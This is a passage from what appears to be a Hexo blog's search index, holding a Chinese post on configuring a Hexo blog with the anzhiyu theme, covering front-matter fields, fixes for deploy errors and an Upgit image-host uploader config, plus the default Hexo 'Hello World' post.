class="line">---</span><br></pre></td></tr></table></figure><table><thead><tr><th>写法</th><th>解释</th></tr></thead><tbody><tr><td>title</td><td>【必需】文章标题</td></tr><tr><td>date</td><td>【必需】文章创建日期</td></tr><tr><td>updated</td><td>【可选】文章更新日期</td></tr><tr><td>tags</td><td>【可选】文章标籤</td></tr><tr><td>categories</td><td>【可选】文章分类</td></tr><tr><td>keywords</td><td>【可选】文章关键字</td></tr><tr><td>description</td><td>【可选】文章描述</td></tr><tr><td>top_img</td><td>【可选】文章顶部图片</td></tr><tr><td>cover</td><td>【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false&#x2F;图片地址&#x2F;留空)</td></tr><tr><td>comments</td><td>【可选】显示文章评论模块(默认 true)</td></tr><tr><td>toc</td><td>【可选】显示文章TOC(默认为设置中toc的enable配置)</td></tr><tr><td>toc_number</td><td>【可选】显示toc_number(默认为设置中toc的number配置)</td></tr><tr><td>toc_style_simple</td><td>【可选】显示 toc 简洁模式</td></tr><tr><td>copyright</td><td>【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</td></tr><tr><td>copyright_author</td><td>【可选】文章版权模块的文章作者</td></tr><tr><td>copyright_author_href</td><td>【可选】文章版权模块的文章作者链接</td></tr><tr><td>copyright_url</td><td>【可选】文章版权模块的文章连结链接</td></tr><tr><td>copyright_info</td><td>【可选】文章版权模块的版权声明文字</td></tr><tr><td>mathjax</td><td>【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>katex</td><td>【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>aplayer</td><td>【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</td></tr><tr><td>highlight_shrink</td><td>【可选】配置代码框是否展开(true&#x2F;false)(默认为设置中highlight_shrink的配置)</td></tr><tr><td>aside</td><td>【可选】显示侧边栏 (默认 true)</td></tr></tbody></table><p>写好以后，我们还是一样打开git bash生成、上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>在网站配置这里遇到了相当多的问题 有些问题很快解决了 有些就真的花了很多时间</p><h3 id="访问-about路由-回显配置的md文档"><a href="#访问-about路由-回显配置的md文档" class="headerlink" title="访问&#x2F;about路由 回显配置的md文档"></a>访问&#x2F;about路由 回显配置的md文档</h3><p>这是这个博客搭建遇到的最大的问题 </p><p>我按照anzhiyu官网文档搭建关于页面</p><p>搭好了访问发现不能访问yaml的前端页面 只能访问它的配置页面</p><p>这个问题我卡了两三天</p><p>这个问题出现的原因主要是配置文档存在隐藏字符 因为这个文档不是直接生成的 我是从别的博客上复制了一部分下来 所以有隐藏字符 </p><p>这里最好是直接生成 或者手打 复制的话要检查有没有隐藏字符</p><h3 id="hexo-d时遇到的问题"><a href="#hexo-d时遇到的问题" class="headerlink" title="hexo d时遇到的问题"></a>hexo d时遇到的问题</h3><p>主要就是这个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br><span class="line">Error: Spawn failed</span><br><span class="line">    at ChildProcess.&lt;anonymous&gt; (D:\BlogFile\node_modules\hexo-deployer-git\node_modules\hexo-util\lib\spawn.js:51:21)</span><br><span class="line">    at ChildProcess.emit (node:events:518:28)</span><br><span class="line">    at cp.emit (D:\BlogFile\node_modules\cross-spawn\lib\enoent.js:34:29)</span><br><span class="line">    at ChildProcess._handle.onexit (node:internal/child_process:294:12)</span><br></pre></td></tr></table></figure><p>对应这个报错 目前我还没有非常完美的解决方法</p><p>遇到过几次了 用的是不同的解决放到 但是都不能完全解决这个问题 都是当时解决了 后面配置的时候又出现了</p><p>法1：</p><p>不管他 他过一会就会自己好 但是这个过一会没有非常精确的数据、</p><p>法2：</p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br></pre></td></tr></table></figure><p>这个方法有时奏效</p><p>法3：</p><p>更新npm</p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure><p>法4：</p><p>清除npm缓存 并重构依赖</p><p>先执行 清除缓存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm cache clean --force</span><br></pre></td></tr></table></figure><p>再执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>法5</p><p>这是我用的最离奇的方法 可能就是法1</p><p>当时是我查看hexo的报错日志 然后就直接好了</p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo deploy --debug</span><br></pre></td></tr></table></figure><h2 id="图床配置"><a href="#图床配置" class="headerlink" title="图床配置"></a>图床配置</h2><p>之前是用的picgo+github 但是他不是很稳定 所以这次我用的是<a href="https://7bu.top/">去不图床</a></p><p>这个比较便宜10块1G </p><p>用的时候直接上传 找URL就行</p><p><img src="https://bu.dusays.com/2024/05/12/6640e700d843e.png" alt="image-20240509020222854"></p><p>如果是去不图床的话 在连接typora的时候不能用picgo(不支持) 要用Upgit</p><p><strong>Upgit:</strong></p><p><a href="https://github.com/pluveto/upgit/releases">Upgit</a> 可以快捷地将文件上传到去不图床并得到其直链。简洁跨平台不常驻内存。可作为 Typora 自定义上传器使用</p><p>将下面代码保存为 <code>config.toml</code> 文件，其中 <code>TOKEN</code> 项，需改成自己的。注意 <code>TOKEN</code> 前的 <code>Bearer</code> 不要忘记添:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default_uploader = &quot;lskypro2&quot;</span><br><span class="line">[uploaders.lskypro2]</span><br><span class="line">host = &quot;https://7bu.top&quot;</span><br><span class="line">token = &quot;Bearer TOKEN&quot;</span><br></pre></td></tr></table></figure><p>另外创建文件夹 <code>extensions</code>，并将下面代码保存为文件 <code>lskypro.jsonc</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;meta&quot;: &#123;</span><br><span class="line">        &quot;id&quot;: &quot;lskypro2&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;LskyPro2 Uploader&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;simple-http-uploader&quot;,</span><br><span class="line">        &quot;version&quot;: &quot;2.0.0&quot;,</span><br><span class="line">        &quot;repository&quot;: &quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;http&quot;: &#123;</span><br><span class="line">        &quot;request&quot;: &#123;</span><br><span class="line">            &quot;url&quot;: &quot;$(ext_config.host)/api/v1/upload&quot;,</span><br><span class="line">            &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">            &quot;headers&quot;: &#123;</span><br><span class="line">                &quot;Content-Type&quot;: &quot;multipart/form-data&quot;,</span><br><span class="line">                &quot;Authorization&quot;: &quot;$(ext_config.token)&quot;,</span><br><span class="line">                &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;body&quot;: &#123;</span><br><span class="line">                &quot;file&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;file&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$(task.local_path)&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;token&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$(ext_config.token)&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;upload&quot;: &#123;</span><br><span class="line">        &quot;rawUrl&quot;: &#123;</span><br><span class="line">            &quot;from&quot;: &quot;json_response&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;data.links.url&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>拿token:</strong></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dbd2c23.png" alt="image-20240511175154599"></p><p>这里我只启用了上传图片</p><p><strong>使用方法：</strong></p><p>cmd到upgit目录下 执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upgit.exe FILENAME</span><br></pre></td></tr></table></figure><p>就可以将图片上传到图床</p><p><strong>连接Typora:</strong></p><p>转到 Image 选自定义命令作为图像上传器，在命令文本框中输入 Upgit 程序位置，然后就可以使用了：</p><p><img src="https://bu.dusays.com/2024/05/11/663f484a10070.png" alt="image-20240511182823193"></p><p><img src="https://bu.dusays.com/2024/05/11/663f48650bed9.png" alt="image-20240511182850080"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/05/02/hello-world/"/>
      <url>/2024/05/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
